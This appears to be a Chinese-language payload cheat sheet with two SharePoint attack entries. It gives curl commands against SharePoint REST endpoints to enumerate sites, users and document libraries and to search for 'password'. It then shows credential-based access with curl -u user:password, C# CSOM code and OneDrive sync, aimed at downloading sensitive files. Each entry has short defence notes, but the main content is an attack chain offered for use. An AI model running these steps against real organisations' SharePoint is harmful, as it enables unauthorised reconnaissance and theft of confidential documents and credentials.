# SharePoint攻击

_2 条 intranet payload_

### SharePoint枚举  `sharepoint-enum`
_枚举SharePoint站点和文件_
子类：**枚举** · tags: `sharepoint` `enum` `recon`

**前置条件：**
- SharePoint可访问

**攻击链：**

**站点枚举**
> 枚举站点
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点
```

**用户枚举**
> 枚举用户
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表
```

**文件枚举**
> 枚举文档库
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表
```

**搜索文件**
> 搜索敏感内容
_platform: linux_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
搜索敏感文件
```


**概述：** SharePoint REST API可用于枚举。

**漏洞原理：** SharePoint API暴露过多信息。

**利用方法：** 利用流程：1) 枚举站点 2) 枚举用户 3) 搜索敏感文件

**防御措施：** 防御措施：1) 限制API访问 2) 配置权限 3) 监控异常请求

---

### SharePoint文件访问  `sharepoint-file-access`
_访问SharePoint文档库中的文件_
子类：**文件访问** · tags: `sharepoint` `file` `access`

**前置条件：**
- SharePoint凭证或漏洞

**攻击链：**

**Web界面访问**
> Web界面访问
```
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件
```

**REST API访问**
> REST API访问
_platform: linux_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容
```
**语法解析：**
- `_api/web/lists` — REST API端点 _keyword_
- `getbytitle` — 按名称获取列表 _keyword_

**CSOM访问**
> CSOM访问
_platform: windows_
```
使用SharePoint客户端对象模型:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**OneDrive同步**
> OneDrive同步
```
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据
```


**概述：** SharePoint文件可通过多种方式访问。

**漏洞原理：** 获取凭证后可访问所有授权文档。

**利用方法：** 利用流程：1) 获取凭证 2) 访问文档库 3) 下载敏感文件

**防御措施：** 防御措施：1) 权限最小化 2) 监控文件访问 3) 数据分类保护

---
